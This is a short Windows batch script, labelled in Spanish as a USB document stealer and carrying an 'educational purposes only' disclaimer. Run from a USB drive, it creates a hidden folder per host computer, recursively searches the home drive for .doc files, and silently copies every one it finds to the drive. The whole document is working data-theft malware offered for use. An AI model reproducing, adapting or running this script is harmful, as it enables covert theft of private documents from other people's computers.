@echo off
::HGP-USBpC sTeaLer
::Creado Por Guerrerohgp
::Solo con proposito educativo,
::no soy responsable del mal uso
::de este script.
 
::http://guerrerohgp.blogspot.com
 
@setlocal enabledelayedexpansion 
 
@set "usb=%~d0\"
@set "h=!usb!26\%computername%\"
 
@start !usb!
@if not exist "!usb!26\" (@md "!usb!26"&&attrib +h "!usb!26")
@if not exist "!h!" (
	@md "!h!"
) else (
	@exit
)
 
 
%homedrive%
@for /f "delims=?" %%a in ('dir /b /s "*.doc"') do (@copy /y "%%a" "!h!">null)
@exit
